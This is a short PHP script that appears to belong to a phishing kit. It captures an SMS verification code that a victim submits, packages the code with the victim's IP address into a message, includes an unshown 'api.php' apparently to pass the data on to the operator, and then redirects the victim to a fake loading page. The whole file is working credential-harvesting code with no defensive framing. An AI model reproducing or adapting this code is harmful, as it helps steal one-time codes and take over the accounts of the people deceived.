<?php

session_start();



$sms = $_SESSION['sms'] = $_POST['sms'];


$hexor = '
# SMS Code 📱
# Code : '.$_SESSION["sms"].' 
# IP : '.$_SERVER['REMOTE_ADDR'].' 
';







include("api.php"); 



header('Location: ../loading2.php');


?>


